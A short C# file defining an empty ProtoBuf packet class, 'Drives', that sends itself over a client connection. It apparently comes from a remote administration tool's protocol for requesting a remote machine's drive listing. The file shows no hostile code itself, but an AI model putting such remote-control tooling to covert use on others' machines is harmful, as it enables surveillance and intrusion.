using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Drives : IPacket
    {
        public Drives()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}